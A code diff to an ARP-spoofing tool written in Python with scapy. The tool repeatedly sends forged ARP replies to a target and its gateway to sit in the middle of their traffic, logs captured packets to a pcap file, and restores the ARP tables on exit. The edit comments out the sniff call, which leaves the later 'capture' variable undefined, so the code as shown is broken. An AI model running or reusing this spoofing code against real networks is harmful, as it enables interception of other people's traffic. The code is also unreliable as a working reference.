@@ -27,7 +27,7 @@ class ArpSpoofer:
     
     # Method to restore ARP tables of all devices
     def cleanup(self, gateway_ip, target_ip):
-        print(" exiting arpspoof... cleaning up...")
+        print(" cleaning up and exiting arpspoof...\n")
 
         target_mac = get_mac_address(target_ip)
         gateway_mac = get_mac_address(gateway_ip)
@@ -39,12 +39,19 @@ class ArpSpoofer:
         target_packet = self.target_ethernet / target_arp
         gateway_packet = self.gateway_ethernet / gateway_arp
 
+        # Show the packets
+        print(target_packet.show())
+        print(gateway_packet.show())
+
+        # Send the packets
         scapy.sendp(target_packet, iface="eth0") # Send to target
         scapy.sendp(gateway_packet, iface="eth0") # Send to gateway
 
     # Method to spoof ARP tables for target and gateway devices
     def spoof(self, gateway_ip, target_ip):
         try:
+            # target_filter = "host " + target_ip + " and tcp"
+            # capture = scapy.sniff(iface="eth0", filter=target_filter)
             while True:
                 target_mac = get_mac_address(target_ip)
                 gateway_mac = get_mac_address(gateway_ip)
@@ -58,15 +65,15 @@ class ArpSpoofer:
                 target_packet = self.target_ethernet / target_arp
                 gateway_packet = self.gateway_ethernet / gateway_arp
 
-                # Send the packet
+                # Show the packets
                 print(target_packet.show())
                 print(gateway_packet.show())
 
+                # Send the packets
                 scapy.sendp(target_packet, iface="eth0") # Send spoofed ARP replies to target
                 scapy.sendp(gateway_packet, iface="eth0") # Send spoofed ARP replies to gateway
 
                 time.sleep(2) # Resend packets every 2 seconds (changing might affect spoofing effectiveness)
         except KeyboardInterrupt:
-            capture = scapy.sniff(iface="eth0", filter="tcp", count=10) # Capture ten packets
             scapy.wrpcap("packet_log.pcap", capture) # Log capture to a file
             self.cleanup(gateway_ip, target_ip) # Restore ARP tables and remove the MITM position
